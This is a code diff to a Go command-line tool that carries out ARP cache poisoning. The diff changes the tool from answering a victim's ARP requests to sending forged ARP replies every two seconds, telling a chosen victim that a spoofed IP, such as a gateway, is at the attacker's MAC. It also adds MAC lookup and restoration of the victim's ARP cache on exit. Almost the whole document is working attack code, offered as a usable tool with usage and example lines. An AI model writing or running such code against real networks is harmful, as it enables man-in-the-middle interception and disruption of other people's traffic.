@@ -1,10 +1,13 @@
 package main
 
 import (
+	"context"
 	"fmt"
 	"net"
 	"net/netip"
 	"os"
+	"os/signal"
+	"time"
 
 	"github.com/mdlayher/arp"
 )
@@ -45,7 +48,41 @@ func parseIPv4(s string) (netip.Addr, error) {
 	return ip, nil
 }
 
-func run(ifname, victimIPStr, spoofedIPStr string) error {
+func resolveMAC(client *arp.Client, ip netip.Addr, macStr string) (net.HardwareAddr, error) {
+	if macStr != "" {
+		mac, err := net.ParseMAC(macStr)
+		if err != nil {
+			return nil, fmt.Errorf("invalid target MAC: %w", err)
+		}
+		return mac, nil
+	}
+
+	mac, err := client.Resolve(ip)
+	if err != nil {
+		return nil, fmt.Errorf("resolve MAC for %s: %w", ip, err)
+	}
+	return mac, nil
+}
+
+func writeARPReply(client *arp.Client, srcMAC net.HardwareAddr, srcIP netip.Addr, dstMAC net.HardwareAddr, dstIP netip.Addr) error {
+	packet, err := arp.NewPacket(arp.OperationReply, srcMAC, srcIP, dstMAC, dstIP)
+	if err != nil {
+		return err
+	}
+	return client.WriteTo(packet, dstMAC)
+}
+
+func restoreARP(client *arp.Client, spoofedMAC net.HardwareAddr, spoofedIP netip.Addr, victimMAC net.HardwareAddr, victimIP netip.Addr) {
+	fmt.Println("[*] Restoring victim ARP cache...")
+	for i := 0; i < 3; i++ {
+		if err := writeARPReply(client, spoofedMAC, spoofedIP, victimMAC, victimIP); err != nil {
+			fmt.Fprintf(os.Stderr, "restore ARP reply: %v\n", err)
+		}
+		time.Sleep(300 * time.Millisecond)
+	}
+}
+
+func run(ifname, victimIPStr, spoofedIPStr, victimMACStr, spoofedMACStr string) error {
 	iface, myIP, err := getInterface(ifname)
 	if err != nil {
 		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
@@ -66,40 +103,59 @@ func run(ifname, victimIPStr, spoofedIPStr string) error {
 	}
 	defer client.Close()
 
-	fmt.Printf("[*] Local MAC: %s\n", iface.HardwareAddr)
-	fmt.Printf("[*] Local IP : %s\n", myIP)
-	fmt.Printf("[*] Spoofing: %s claims to be %s\n", victimIP, spoofedIP)
-	fmt.Printf("[*] Listening for ARP requests on %s...\n", ifname)
+	victimMAC, err := resolveMAC(client, victimIP, victimMACStr)
+	if err != nil {
+		return err
+	}
+	spoofedMAC, err := resolveMAC(client, spoofedIP, spoofedMACStr)
+	if err != nil {
+		return err
+	}
+
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
+	defer stop()
+
+	fmt.Printf("[*] Local MAC : %s\n", iface.HardwareAddr)
+	fmt.Printf("[*] Local IP  : %s\n", myIP)
+	fmt.Printf("[*] Victim    : %s / %s\n", victimIP, victimMAC)
+	fmt.Printf("[*] Spoofed IP: %s / real MAC %s\n", spoofedIP, spoofedMAC)
+	fmt.Printf("[*] Sending ARP replies: %s is at %s\n", spoofedIP, iface.HardwareAddr)
+	fmt.Println("[*] Press Ctrl+C to restore ARP cache and exit")
+
+	ticker := time.NewTicker(2 * time.Second)
+	defer ticker.Stop()
 
 	for {
-		packet, _, err := client.Read()
-		if err != nil {
-			return fmt.Errorf("read ARP packet: %w", err)
-		}
-		if packet.Operation != arp.OperationRequest {
-			continue
-		}
-		if packet.SenderIP != victimIP || packet.TargetIP != spoofedIP {
-			continue
-		}
-
-		fmt.Printf("[>] Caught ARP request for %s from %s / %s\n", spoofedIP, packet.SenderIP, packet.SenderHardwareAddr)
-
-		if err := client.Reply(packet, iface.HardwareAddr, spoofedIP); err != nil {
+		if err := writeARPReply(client, iface.HardwareAddr, spoofedIP, victimMAC, victimIP); err != nil {
 			fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
-			continue
+		} else {
+			fmt.Printf("[+] Sent: %s is at %s -> %s\n", spoofedIP, iface.HardwareAddr, victimIP)
 		}
-		fmt.Printf("[+] Sent ARP reply: %s is at %s\n", spoofedIP, iface.HardwareAddr)
+
+		select {
+		case <-ctx.Done():
+			restoreARP(client, spoofedMAC, spoofedIP, victimMAC, victimIP)
+			return nil
+		case <-ticker.C:
+		}
 	}
 }
 
 func main() {
-	if len(os.Args) != 4 {
-		fmt.Fprintf(os.Stderr, "Usage: %s <interface> <victim_ip> <spoofed_ip>\n", os.Args[0])
+	if len(os.Args) != 4 && len(os.Args) != 6 {
+		fmt.Fprintf(os.Stderr, "Usage: %s <interface> <victim_ip> <spoofed_ip> [victim_mac spoofed_mac]\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "Example: sudo %s eth0 192.168.56.101 192.168.56.1\n", os.Args[0])
 		os.Exit(1)
 	}
 
-	if err := run(os.Args[1], os.Args[2], os.Args[3]); err != nil {
+	victimMAC := ""
+	spoofedMAC := ""
+	if len(os.Args) == 6 {
+		victimMAC = os.Args[4]
+		spoofedMAC = os.Args[5]
+	}
+
+	if err := run(os.Args[1], os.Args[2], os.Args[3], victimMAC, spoofedMAC); err != nil {
 		fmt.Fprintln(os.Stderr, err)
 		os.Exit(1)
 	}
